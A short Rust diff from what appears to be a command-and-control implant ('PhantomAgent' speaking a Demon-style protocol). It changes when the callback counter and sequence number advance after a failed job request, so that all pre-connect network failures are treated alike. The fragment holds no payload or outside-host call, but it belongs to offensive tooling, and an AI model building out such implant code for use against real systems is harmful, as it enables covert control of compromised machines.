@@ -44,9 +44,10 @@ impl PhantomAgent {
 
         let response = self.transport.send(&packet).await;
 
-        // Advance unless connection-refused (server never processed the packet).
+        // Advance unless this is a pre-connect failure (server never processed the packet).
+        // Covers ECONNREFUSED, DNS failures, connect timeouts — see is_pre_connect_failure().
         // See COMMAND_CHECKIN advance in checkin() for the full rationale.
-        if !matches!(&response, Err(PhantomError::ConnectionRefused(_))) {
+        if !matches!(&response, Err(PhantomError::PreConnectFailure(_))) {
             self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
             self.callback_seq += 1;
         }
